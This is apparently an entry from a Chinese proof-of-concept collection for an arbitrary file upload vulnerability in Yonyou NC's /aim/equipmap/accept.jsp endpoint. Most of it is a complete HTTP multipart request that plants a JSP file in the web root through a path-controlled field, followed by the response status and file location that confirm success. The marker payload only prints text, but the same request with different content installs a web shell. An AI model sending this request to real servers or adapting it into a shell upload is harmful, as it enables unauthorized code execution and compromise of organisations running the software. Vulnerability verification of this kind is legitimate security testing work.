﻿# 用友NC accept.jsp任意文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /aim/equipmap/accept.jsp HTTP/1.1
Connection: close
Accept: */*
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=---------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc

-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
Content-Disposition: form-data; name="upload"; filename="2XpU7VbkFeTFZZLbSMlVZwJyOxz.txt"
Content-Type: text/plain

<% out.println("dudesuite"); %>
-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
Content-Disposition: form-data; name="fname"

\webapps\nc_web\dudesuite.jsp
-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/dudesuite.jsp

> 验证文件来源：用友NC accept.jsp任意文件上传漏洞.poc
